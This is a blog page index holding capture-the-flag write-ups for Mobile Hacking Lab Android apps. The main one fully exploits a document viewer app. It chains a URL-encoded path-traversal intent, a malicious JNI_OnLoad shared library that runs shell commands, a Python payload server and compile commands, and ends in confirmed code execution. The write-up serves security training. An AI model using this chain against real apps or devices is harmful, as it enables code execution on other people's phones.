style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThere\u0026rsquo;s only one activity at the moment so lets look into it.\u003c/p\u003e","title":"MHL Note Keeper"},{"content":"Challenge Description Welcome to the Remote Code Execution (RCE) Challenge! This lab provides a real-world scenario where you\u0026rsquo;ll explore vulnerabilities in popular software. Your mission is to exploit a path traversal vulnerability combined with dynamic code loading to achieve remote code execution.\ndocumentviewer.apk\nSolution I started out by working on static analysis.\nStatic Analysis As usual, I check the AndroidManifest.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.documentviewer.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; There is only one MainActivity activity and it has the intent filter where it accept some URI parameter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater()); Intrinsics.checkNotNullExpressionValue(inflate, \u0026#34;inflate(...)\u0026#34;); this.binding = inflate; if (inflate == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;binding\u0026#34;); inflate = null; } setContentView(inflate.getRoot()); BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, null, null, new MainActivity$onCreate$1(this, null), 3, null); setLoadButtonListener(); handleIntent(); loadProLibrary(); if (this.proFeaturesEnabled) { initProFeatures(); } } Starting with onCreate function, the things to get note here is it loads 3 different function, setLoadButtonListener, handleIntent and loadProLibrary.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 private final void handleIntent() { Intent intent = getIntent(); String action = intent.getAction(); Uri data = intent.getData(); if (Intrinsics.areEqual(\u0026#34;android.intent.action.VIEW\u0026#34;, action) \u0026amp;\u0026amp; data != null) { CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1\u0026lt;Uri, Unit\u0026gt;() { // from class: com.mobilehackinglab.documentviewer.MainActivity$handleIntent$1 { super(1); } @Override // kotlin.jvm.functions.Function1 public /* bridge */ /* synthetic */ Unit invoke(Uri uri) { invoke2(uri); return Unit.INSTANCE; } /* renamed from: invoke, reason: avoid collision after fix types in other method */ public final void invoke2(Uri uri) { MainActivity mainActivity = MainActivity.this; Intrinsics.checkNotNull(uri); mainActivity.renderPdf(uri); } })); } } This handleIntent function basically get data from incoming intent and it will run CopyUtil.INSTANCE.copyFileFromUri and renderPdf function.\n1 2 3 4 5 6 7 8 9 10 11 12 private final void loadProLibrary() { try { String abi = Build.SUPPORTED_ABIS[0]; File libraryFolder = new File(getApplicationContext().getFilesDir(), \u0026#34;native-libraries/\u0026#34; + abi); File libraryFile = new File(libraryFolder, \u0026#34;libdocviewer_pro.so\u0026#34;); System.load(libraryFile.getAbsolutePath()); this.proFeaturesEnabled = true; } catch (UnsatisfiedLinkError e) { Log.e(TAG, \u0026#34;Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)\u0026#34;, e); this.proFeaturesEnabled = false; } } As for the loadProLibrary function, it seems to be trying to load a native library called libdocviewer_pro.so in the specific path. this could be my endpoint of performing RCE if I could write a file in that endpoint.\n1 2 3 4 5 6 7 8 9 10 11 12 13 public final MutableLiveData\u0026lt;Uri\u0026gt; copyFileFromUri(Uri uri) { Intrinsics.checkNotNullParameter(uri, \u0026#34;uri\u0026#34;); URL url = new URL(uri.toString()); File file = CopyUtil.DOWNLOADS_DIRECTORY; String lastPathSegment = uri.getLastPathSegment(); if (lastPathSegment == null) { lastPathSegment = \u0026#34;download.pdf\u0026#34;; } File outFile = new File(file, lastPathSegment); MutableLiveData liveData = new MutableLiveData(); BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromUri$1(outFile, url, liveData, null), 2, null); return liveData; } Moving to copyFileFromUri function, it will download the file from provided URI to externalStoragePublicDirectory which is the Download folder of the android. Based on the code, it is possible to save file to another file directory by abusing the getLastPathSegment function. The getLastPathSegment function will take the word on the last / and I could bypass this using url encode method %2f. From my current understanding, I believe it is possible to write a file anywhere with this copyFileFromUri function. I then proceed to dynamic analysis to test out the idea.\nDynamic Analysis I started out by playing around with the APK first.\n1 2 04-07 23:36:52.050 19367 19367 E Companion: Unable to load library with Pro version features! (You can ignore this error if you are using the Free version) 04-07 23:36:52.050 19367 19367 E Companion: java.lang.UnsatisfiedLinkError: dlopen failed: library \u0026#34;/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/libdocviewer_pro.so\u0026#34; not found Looking into the logcat, I noticed that it is trying to run loadProLibrary function. It also provide me the path that it is looking at /data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/libdocviewer_pro.so.\n1 2 adb shell am start -a android.intent.action.VIEW -d \u0026#39;https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf\u0026#39; -t application/pdf Starting: Intent { act=android.intent.action.VIEW dat=https://www.w3.org/... typ=application/pdf } I then started a simple intent that provide dummy pdf to see how it works.\nIt basically just render the PDF file into the application.\n1 2 3 beryllium:/sdcard/Download # ls -la total 80 -rw-rw---- 1 root everybody 13264 2025-04-07 23:41 dummy.pdf After looking into my Download folder, the dummy.pdf is downloaded and saved inside the Download folder. I then tried to see if it\u0026rsquo;s possible to save the file in other place. To do so, I started a simple web server that will just provide the same content even the file name is different.\n1 2 3 4 PS C:\\Users\\kskin\u0026gt; adb shell am start -a android.intent.action.VIEW -d \u0026#39;http://192.168.68.107:8000/test.pdf\u0026#39; -t application/pdf Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8000/... typ=application/pdf } PS C:\\Users\\kskin\u0026gt; adb shell am start -a android.intent.action.VIEW -d \u0026#39;http://192.168.68.107:8000/..%2fDocuments%2ftest.pdf\u0026#39; -t application/pdf Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8000/... typ=application/pdf } 1 2 3 python -c \u0026#34;from http.server import *;HTTPServer((\u0026#39;\u0026#39;,8000),type(\u0026#39;\u0026#39;,(BaseHTTPRequestHandler,),{\u0026#39;do_GET\u0026#39;:lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(open(\u0026#39;sample.pdf\u0026#39;,\u0026#39;rb\u0026#39;).read()))})).serve_forever()\u0026#34; 192.168.68.109 - - [07/Apr/2025 23:46:51] \u0026#34;GET /test.pdf HTTP/1.1\u0026#34; 200 - 192.168.68.109 - - [07/Apr/2025 23:50:55] \u0026#34;GET /..%2fDocuments%2ftest.pdf HTTP/1.1\u0026#34; 200 - I tried performing 2 intent where one contains a simple path traveral with url encoding to see if its possible to save the file in another directory.\n1 2 3 4 5 beryllium:/data/media/0/Documents # ls -la total 36 drwxrwsr-x 3 media_rw media_rw 4096 2025-04-07 23:50 . drwxrws--- 24 media_rw media_rw 4096 2025-03-30 14:19 .. -rw-rw-r-- 1 media_rw media_rw 18810 2025-04-07 23:50 test.pdf It is possible to write file into another directory. By abusing this vulnerability, it is possible for me to write a shared library into the specific directory but to do so, I will need to create one shared library.\n1 2 3 4 5 6 7 #include \u0026lt;jni.h\u0026gt; #include \u0026lt;cstdlib\u0026gt; JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) { system(\u0026#34;whoami \u0026gt;\u0026gt; /sdcard/Download/test.txt\u0026#34;); return JNI_VERSION_1_6; } I write a simple C++ code that abuse the JNI_OnLoad function to instead load the command execution when the shared library is loaded.\n1 2 PS E:\\Desktop\\Android\\APK\\MHL\u0026gt; E:\\\\app\\\\android-sdk\\\\ndk\\\\27.0.12077973\\\\toolchains\\\\llvm\\\\prebuilt\\\\windows-x86_64\\\\bin\\\\clang++.exe --target=aarch64-none-linux-android30 --sysroot=E:/app/android-sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/windows-x86_64/sysroot -o .\\test.cpp.o -c .\\test.cpp PS E:\\Desktop\\Android\\APK\\MHL\u0026gt; E:\\\\app\\\\android-sdk\\\\ndk\\\\27.0.12077973\\\\toolchains\\\\llvm\\\\prebuilt\\\\windows-x86_64\\\\bin\\\\clang++.exe --target=aarch64-none-linux-android30 --sysroot=E:/app/android-sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/windows-x86_64/sysroot --shared -static-libstdc++ -o .\\libdocviewer_pro.so .\\test.cpp.o This is the command for me to compile an amd64 shared library. To make life easier, it is better to use Android studio to compile it instead of using my method. After compiling it, I use the simple http server from python to host my shared library and abuse the path traversal vulnerability to write the shared library into the specific directory.\n1 2 PS E:\\Desktop\\Android\\apk\\mhl\u0026gt; adb shell am start -a android.intent.action.VIEW -d \u0026#39;http://192.168.68.107:8000/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Farm64-v8a%2Flibdocviewer_pro.so\u0026#39; -t application/pdf Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8000/... typ=application/pdf } 1 2 python -c \u0026#34;from http.server import *;HTTPServer((\u0026#39;\u0026#39;,8000),type(\u0026#39;\u0026#39;,(BaseHTTPRequestHandler,),{\u0026#39;do_GET\u0026#39;:lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(open(\u0026#39;libdocviewer_pro.so\u0026#39;,\u0026#39;rb\u0026#39;).read()))})).serve_forever()\u0026#34; 192.168.68.109 - - [08/Apr/2025 00:01:39] \u0026#34;GET /..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Farm64-v8a%2Flibdocviewer_pro.so HTTP/1.1\u0026#34; 200 - 1 2 3 4 5 beryllium:/ # ls -la /data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/arm64-v8a/ total 16 drwx------ 2 u0_a343 u0_a343 4096 2025-04-08 00:01 . drwx------ 3 u0_a343 u0_a343 4096 2025-04-08 00:01 .. -rw------- 1 u0_a343 u0_a343 5496 2025-04-08 00:01 libdocviewer_pro.so After confirming the file is successfully write into the desired endpoint, the shared library should be executed if I just restart the application.\nWhen I restart the application, it stop working because of this error from logcat.\n1 2 3 04-08 00:06:05.242 24335 24335 E AndroidRuntime: FATAL EXCEPTION: main 04-08 00:06:05.242 24335 24335 E AndroidRuntime: Process: com.mobilehackinglab.documentviewer, PID: 24335 04-08 00:06:05.242 24335 24335 E AndroidRuntime: java.lang.UnsatisfiedLinkError: No implementation found for void com.mobilehackinglab.documentviewer.MainActivity.initProFeatures() (tried Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures and Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures__) This basically means the shared library looking for a function initProFeatures which is not provided in the shared library but it is loaded in onCreate function in MainActivity. Although it has error, the command execution is still successful due to the onLoad function in shared library.\n1 2 3 4 5 beryllium:/sdcard/Download # cat test.txt u0_a343 u0_a343 u0_a343 u0_a343 This means that my RCE is successful despite having some minor error which could be easily fixed by adding the required function. It is also possible to write a POC app to send the intent which exploit the path traversal write and restart the application.\nThings I learned from this challenge compiling and linking the shared library. writing a command execution shared library. creating a simple HTTP server that redirects to the same file no matter what the endpoint is. abusing getLastPathSegment function to perform path traversal write. ","permalink":"https://callmeks.github.io/posts/mhl-document-viewer/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the Remote Code Execution (RCE) Challenge! This lab provides a real-world scenario where you\u0026rsquo;ll explore vulnerabilities in popular software. Your mission is to exploit a path traversal vulnerability combined with dynamic code loading to achieve remote code execution.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/documentviewer.apk\"\u003edocumentviewer.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eI started out by working on static analysis.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eAs usual, I check the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.mobilehackinglab.documentviewer.MainActivity\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:exported=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.MAIN\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.LAUNCHER\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.VIEW\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.DEFAULT\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.BROWSABLE\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;file\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:mimeType=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;application/pdf\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThere is only one \u003ccode\u003eMainActivity\u003c/code\u003e activity and it has the intent filter where it accept some URI parameter.\u003c/p\u003e","title":"MHL Document Viewer"},{"content":"Challenge Description Welcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android\u0026rsquo;s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It\u0026rsquo;s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.\npostboard.apk\nSolution As usual, I started by performing static analysis to get some understanding of the application.\nStatic Analysis I started out by reading the AndroidManifest.xml code after decompiling using jadx-gui.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.postboard.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;postboard\u0026#34; android:host=\u0026#34;postmessage\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; There is only MainActivity activity which is exported and it has this intent filter where it accept URI data postboard://postmessage.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 private final void setupWebView(WebView webView) { webView.getSettings().setJavaScriptEnabled(true); webView.setWebChromeClient(new WebAppChromeClient()); webView.addJavascriptInterface(new WebAppInterface(), \u0026#34;WebAppInterface\u0026#34;); webView.loadUrl(\u0026#34;file:///android_asset/index.html\u0026#34;); } private final void handleIntent() { Intent intent = getIntent(); String action = intent.getAction(); Uri data = intent.getData(); if (!Intrinsics.areEqual(\u0026#34;android.intent.action.VIEW\u0026#34;, action) || data == null || !Intrinsics.areEqual(data.getScheme(), \u0026#34;postboard\u0026#34;) || !Intrinsics.areEqual(data.getHost(), \u0026#34;postmessage\u0026#34;)) { return; } ActivityMainBinding activityMainBinding = null; try { String path = data.getPath(); byte[] decode = Base64.decode(path != null ? StringsKt.drop(path, 1) : null, 8); Intrinsics.checkNotNullExpressionValue(decode, \u0026#34;decode(...)\u0026#34;); String message = StringsKt.replace$default(new String(decode, Charsets.UTF_8), \u0026#34;\u0026#39;\u0026#34;, \u0026#34;\\\\\u0026#39;\u0026#34;, false, 4, (Object) null); ActivityMainBinding activityMainBinding2 = this.binding; if (activityMainBinding2 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;binding\u0026#34;); activityMainBinding2 = null; } activityMainBinding2.webView.loadUrl(\u0026#34;javascript:WebAppInterface.postMarkdownMessage(\u0026#39;\u0026#34; + message + \u0026#34;\u0026#39;)\u0026#34;); } catch (Exception e) { ActivityMainBinding activityMainBinding3 = this.binding; if (activityMainBinding3 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;binding\u0026#34;); } else { activityMainBinding = activityMainBinding3; } activityMainBinding.webView.loadUrl(\u0026#34;javascript:WebAppInterface.postCowsayMessage(\u0026#39;\u0026#34; + e.getMessage() + \u0026#34;\u0026#39;)\u0026#34;); } } Moving 